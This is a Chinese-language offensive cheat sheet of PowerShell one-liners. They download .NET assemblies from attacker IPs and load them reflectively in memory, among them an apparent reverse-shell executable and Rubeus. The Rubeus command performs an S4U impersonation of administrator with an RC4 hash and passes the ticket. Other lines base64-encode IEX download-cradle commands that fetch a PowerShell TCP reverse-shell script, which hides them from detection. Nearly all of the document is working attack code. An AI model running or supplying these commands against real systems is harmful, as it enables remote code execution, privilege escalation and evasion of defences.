# 反射加载```C#```程序

## 下载执行（不带参数）
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()
```

## 下载执行（带参数）
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```

## 从程序集（动态链接库dll）执行指定某个方法
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```


# 加密命令

## windows
```
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

## linux
```
echo 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0
```

## 把ps1文件转成加密命令

这步执行以后会复制命令到粘贴板
```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\path\to\PowerView.ps1')) | clip
```

执行
```
Powershell -EncodedCommand $encodedCommand
```

